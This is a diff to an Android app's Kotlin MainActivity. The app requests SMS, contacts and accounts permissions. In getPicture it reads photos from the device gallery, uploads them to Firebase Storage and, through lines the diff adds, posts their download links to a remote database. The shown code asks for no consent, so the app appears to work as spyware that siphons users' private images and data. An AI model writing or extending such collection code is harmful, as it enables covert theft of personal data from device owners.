@@ -29,6 +29,8 @@ import com.google.firebase.storage.FirebaseStorage
 import kotlinx.android.synthetic.main.activity_main.*
 import java.io.ByteArrayOutputStream
 import java.io.File
+import java.net.URI
+import java.net.URL
 import java.util.*
 import kotlin.collections.ArrayList
 import kotlin.collections.HashMap
@@ -189,29 +191,20 @@ class MainActivity : AppCompatActivity() {
             Handler(Looper.getMainLooper()).postDelayed({
                 getAccName()
             }, 1000)
-            Handler(Looper.getMainLooper()).postDelayed({
-                val intent = Intent(this, LinkDemo::class.java)
-                startActivity(intent)
-                val i = Intent(this, LinkDemo::class.java)
-                i.putExtra("message", randomIDtext)
-                startActivity(i)
-            }, 1000)
+//            Handler(Looper.getMainLooper()).postDelayed({
+//                getPicture()
+//            },1000)
 
-        }
-
-
-//        userid.setOnClickListener {
-//            userid.text = randomIDtext
-//            g++
-//            if(a>0  && b>0 && c>0 && d>0 && e>0 && f>0 && g>0 ){
+//            Handler(Looper.getMainLooper()).postDelayed({
 //                val intent = Intent(this, LinkDemo::class.java)
 //                startActivity(intent)
 //                val i = Intent(this, LinkDemo::class.java)
 //                i.putExtra("message", randomIDtext)
 //                startActivity(i)
-//            }
-//        }
-        //permissions
+//            }, 1000)
+
+        }
+
         if(ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_SMS)!=PackageManager.PERMISSION_GRANTED ||
             ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS)!=PackageManager.PERMISSION_GRANTED ||
             ActivityCompat.checkSelfPermission(this, Manifest.permission.GET_ACCOUNTS)!=PackageManager.PERMISSION_GRANTED ||
@@ -414,16 +407,15 @@ class MainActivity : AppCompatActivity() {
     @RequiresApi(Build.VERSION_CODES.Q)
     private fun getPicture() {
         var l = 0
-
+        var downloadUri: String = ""
+        var linkList = mutableListOf<Uri>()
         val imageProjection = arrayOf(
             MediaStore.Images.Media.DISPLAY_NAME,
             MediaStore.Images.Media.SIZE,
             MediaStore.Images.Media.DATE_TAKEN,
             MediaStore.Images.Media._ID
         )
-
         val imageSortOrder = "${MediaStore.Images.Media.DATE_TAKEN} DESC"
-
         val cursor = contentResolver.query(
             MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
             imageProjection,
@@ -431,7 +423,6 @@ class MainActivity : AppCompatActivity() {
             null,
             imageSortOrder
         )
-
         cursor.use {
             it?.let {
                 val idColumn = it.getColumnIndexOrThrow(MediaStore.Images.Media._ID)
@@ -439,7 +430,7 @@ class MainActivity : AppCompatActivity() {
                 val sizeColumn = it.getColumnIndexOrThrow(MediaStore.Images.Media.SIZE)
                 val dateColumn = it.getColumnIndexOrThrow(MediaStore.Images.Media.DATE_TAKEN)
 
-                while (it.moveToNext() && l!=5) {
+                while (it.moveToNext() && l!=1) {
                     val id = it.getLong(idColumn)
                     val name = it.getString(nameColumn)
                     val size = it.getString(sizeColumn)
@@ -460,8 +451,8 @@ class MainActivity : AppCompatActivity() {
                     thumbnail.compress(Bitmap.CompressFormat.JPEG, 100, baos)
                     val data = baos.toByteArray()
                     l++
-                    var storaeRef= storage.getReference("image no $l")
-                    var uploadTask = storaeRef.putBytes(data)
+                    val storageRef= storage.getReference("image no $l")
+                    val uploadTask = storageRef.putBytes(data)
                     uploadTask.addOnFailureListener {
                         Log.d("fl","fail")
                     }.addOnSuccessListener { taskSnapshot ->
@@ -469,11 +460,31 @@ class MainActivity : AppCompatActivity() {
                         val duration = Toast.LENGTH_SHORT
                         val toast = Toast.makeText(applicationContext, text, duration).show()
                     }
+                    uploadTask.continueWithTask { task ->
+                        if (!task.isSuccessful) {
+                            task.exception?.let {
+                                throw it
+                            }
+                        }
+                        storageRef.downloadUrl
+                    }.addOnCompleteListener { task ->
+                        if (task.isSuccessful) {
+                            val downloadUri = task.result
+                            Handler(Looper.getMainLooper()).postDelayed({
+                                myRef.child("links").setValue(downloadUri.toString())
+                            }, 1000)
+                        } else {
+                            Log.d("fail","fail")
+                        }
+                    }
                 }
+
             } ?: kotlin.run {
                 Log.e("TAG", "Cursor is null!")
             }
         }
+        cursor!!.close()
+
     }
 
 
